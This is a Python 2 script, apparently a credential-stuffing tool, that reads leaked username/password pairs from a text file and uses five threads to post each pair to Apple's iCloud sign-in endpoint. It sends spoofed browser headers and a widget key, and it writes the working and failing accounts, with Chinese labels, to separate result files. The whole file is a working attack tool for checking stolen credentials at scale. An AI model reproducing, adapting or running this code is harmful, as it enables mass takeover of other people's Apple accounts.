# coding: utf8
import requests
import threading
import Queue
import json


class IcloudScan:
    """
    According the Txt to check avaliabled
    """
    def __init__(self, thread_num=5):
        self.url = 'https://idmsa.apple.com/appleauth/auth/signin'
        self.file = 'record.txt'
        self.line_num = 0
        self.right = open('result-right.txt', 'w')
        self.wrong = open('result-error.txt', 'w')
        self.thread_num = thread_num
        self.read_queue = Queue.Queue()
        self.write_queue = Queue.Queue()
        self.html = requests.session()
        self.html.headers.update({
            'Host': 'idmsa.apple.com',
            'Connection': 'keep-alive',
            'Content-Length': '101',
            'X-Apple-Widget-Key': '83545bf919730e51dbfba24e7e8a78d2',
            'Origin': 'https://idmsa.apple.com',
            'X-Apple-I-FD-Client-Info': '{"U":"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36","L":"zh-CN","Z":"GMT+08:00","V":"1.1","F":"N0a44j1e3NlY5BSo9z4ofjb75PaK4Vpjt.gEngMQEjZrVglE4Ww.GEFF0Yz3ccbbJYMLgiPFU77qZoOSix5ezdstlYysrhsui65AQnKA15nW0vLG9mhORoVidPZW2AUMnGWVQdgMVQdg1kzoMpwoNJ9z4oYYLzZ1kzDlSgyyIT1n3wL6k03x0.5EwHXXTSHCSPmtd0wVYPIG_qvoPfybYb5EvYTrYesRNhjCJg7QD36hO3f9p_nH1uzjkD6myjaY2hDpBtOtJJIqSI6KUMnGWpwoNSUC56MnGW87gq1HACVcOJVB38cTjQhUfSHolk2dUf.j7J1gBZEMgzH_y3Cmx_B4WugMJeqDxp.jV2pNk0ug97.Dv64KxN4t1VKWZWu_JzK9zHkcCmx_B4W1kl1BQLz4mvmfTT9oaSumKkpjlRiwerbXh8bUu_LzQW5BNv_BBNlYCa1nkBMfs.9g."}',
            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36',
            'Content-Type': 'application/json',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': 'https://idmsa.apple.com/appleauth/auth/signin?widgetKey=83545bf919730e51dbfba24e7e8a78d2&locale=zh_CN&font=sf',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'zh-CN,zh;q=0.8',
        })

    def read_file(self):
        with open(self.file) as f:
            for line in f:
                self.line_num += 1
                self.read_queue.put(line)
        print 'Read file completed'
        print 'Totol line num is : %s' % self.line_num

    def run(self, thread_name):
        num = 0
        flag = 1
        while 1:
            if not self.read_queue.empty():
                line = self.read_queue.get(timeout=60)
                if line:
                    line = line.strip()
                    if '----' in line:
                        username, passwd = line.split('----')
                    else:
                        username, passwd = line.split()
                num += 1
                print "%s handle the %s record" % (thread_name, num)
                requests_data = json.dumps({
                    'accountName': username,
                    'password': passwd,
                    'rememberMe': 'false',
                    'trustTokens': []
                })
                while flag < 4:
                    try:
                        data = self.html.post(self.url, data=requests_data, verify=True).text
                        result = json.loads(data)
                        # result = json.loads(
                        #     self.html.post(
                        #         self.url,
                        #         data=requests_data,
                        #         verify=True
                        #     ).text
                        # )
                        flag = 4
                    except requests.exceptions.ConnectionError:
                        print '[Error]: The %s time to try again!' % flag

                    message = '账号: %-25s 密码: %-15s ' % (username, passwd)
                    if 'serviceErrors' in result:
                        tmp_result = result['serviceErrors'][0]
                        self.write_queue.put((
                            self.wrong,
                            message + '不正确 错误代码: %s 错误信息: %s \n' % (
                                tmp_result['code'].encode('utf8'),
                                tmp_result['message'].encode('utf8')
                            )))
                    elif not result:
                        self.write_queue.put((
                            self.right,
                            message + '正确\n'
                        ))

                flag = 1
            else:
                print "Record MQ is empty! threading: %s exit" % thread_name
                break

    def write_log(self):
        line = 0
        while 1:
            try:
                fd, message = self.write_queue.get(timeout=60)
                line +=1
                fd.write(message)
            except Queue.Empty:
                print "Writing MQ is empty!, threading exit"
                break
        print "Totle of record writed is %s !" % line

    def main(self):
        thread_list = []
        for thread_tmp in [self.read_file, self.write_log]:
            thread_list.append(
                threading.Thread(target=thread_tmp)
            )
        for tn in range(self.thread_num):
            thread_list.append(
                threading.Thread(target=self.run, args=("Thread-%s" % tn,))
            )
        # run all
        for mission in thread_list:
            mission.start()
        # recycle all
        for mission in thread_list:
            mission.join()
        print "Processing done!"

s = IcloudScan()
s.main()
